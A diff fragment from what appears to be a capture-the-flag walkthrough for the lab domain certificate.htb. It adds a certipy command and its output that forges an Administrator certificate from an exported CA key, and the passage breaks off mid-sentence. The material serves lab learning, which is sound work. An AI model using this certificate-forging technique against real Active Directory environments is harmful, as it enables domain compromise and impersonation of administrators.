@@ -838,8 +838,14 @@ CertUtil: -exportPFX command completed successfully.
 Ill use the serial found in the certipy find command above
 
 ```python
+❯❯❯ certipy-ad forge -ca-pfx GT.pfx -upn Administrator@certificate.htb -subject 'CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB'  
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Saving forged certificate and private key to 'administrator_forged.pfx'
+[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
 ```
+
+After downloading the pfx to my system ill forge a
 
 
 
